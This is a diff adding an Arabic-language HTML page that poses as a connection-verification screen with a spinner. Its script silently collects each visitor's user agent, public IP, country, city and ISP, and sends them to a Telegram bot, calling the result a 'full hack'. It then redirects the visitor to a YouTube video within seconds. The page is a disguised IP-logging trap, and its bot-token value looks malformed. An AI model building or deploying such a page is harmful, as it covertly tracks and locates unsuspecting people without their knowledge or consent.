@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحقق...</title>
+    <style>
+        body {
+            background: #0d1117;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #c9d1d9;
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #30363d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="spinner"></div>
+        <p>جاري التحقق من اتصالك...</p>
+    </div>
+
+    <script>
+        // ================= بيانات البوت =================
+        const BOT_TOKEN = "tg://openmessage?user_id=8717959254";
+        const CHAT_ID = "1497190595";
+        const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
+        // ================================================
+
+        // 1. نجمع بيانات المتصفح الأساسية فوراً
+        const visitorData = {
+            ua: navigator.userAgent,
+            time: new Date().toLocaleString(),
+            url: window.location.href
+        };
+
+        // 2. نبدأ دالة إرسال البريد (تعمل في الخلفية ولا تعلق الصفحة)
+        function sendTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {}); // تجاهل الأخطاء حتى لا نوقف التوجيه
+        }
+
+        // 3. نرسل رسالة أولية (بدون IP) فوراً في الخلفية
+        let initialMsg = `🔴 *زائر جديد (جاري جلب الموقع)* 🔴\n💻 ${visitorData.ua}\n🕒 ${visitorData.time}`;
+        sendTelegram(initialMsg);
+
+        // 4. نحاول جلب IP والموقع، ولكن مع مهلة قصوى 3 ثوان فقط
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000); // نلغي الطلب بعد 3 ثوان
+
+        fetch('https://ip-api.com/json/', { signal: controller.signal })
+            .then(res => res.json())
+            .then(data => {
+                // إذا نجح الجلب، نرسل رسالة مفصلة
+                const fullMsg =
+                    `🔥 *اختراق كامل - تفاصيل الموقع* 🔥\n` +
+                    `🌐 IP: ${data.query || "غير معروف"}\n` +
+                    `📍 الدولة: ${data.country || "غير معروف"}\n` +
+                    `🏙️ المدينة: ${data.city || "غير معروف"}\n` +
+                    `📡 المزود: ${data.isp || "غير معروف"}\n` +
+                    `💻 الجهاز: ${visitorData.ua}\n` +
+                    `🕒 الوقت: ${visitorData.time}`;
+                sendTelegram(fullMsg);
+            })
+            .catch(() => {
+                // إذا فشل الجلب (أو تم إلغاؤه) نرسل تنبيهاً بذلك
+                sendTelegram(`⚠️ *زائر جديد (تعذر جلب الموقع)* ⚠️\n💻 ${visitorData.ua}\n🕒 ${visitorData.time}`);
+            })
+            .finally(() => {
+                clearTimeout(timeoutId); // ننظف المؤقت
+            });
+
+        // 5. **القنبلة الأساسية**: نوجه المستخدم فوراً خلال 1.5 ثانية، حتى لو تعطل الجلب.
+        //    استخدمت 1.5 ثانية فقط بدلاً من 3 ليكون سريعاً جداً.
+        setTimeout(() => {
+            window.location.replace(REDIRECT_URL);
+        }, 1500);
+
+        // 6. خطة احتياطية: إذا لم يتحرك لأي سبب، نجبره على التوجيه خلال 4 ثوان كحد أقصى.
+        setTimeout(() => {
+            window.location.replace(REDIRECT_URL);
+        }, 4000);
+    </script>
+</body>
+</html>
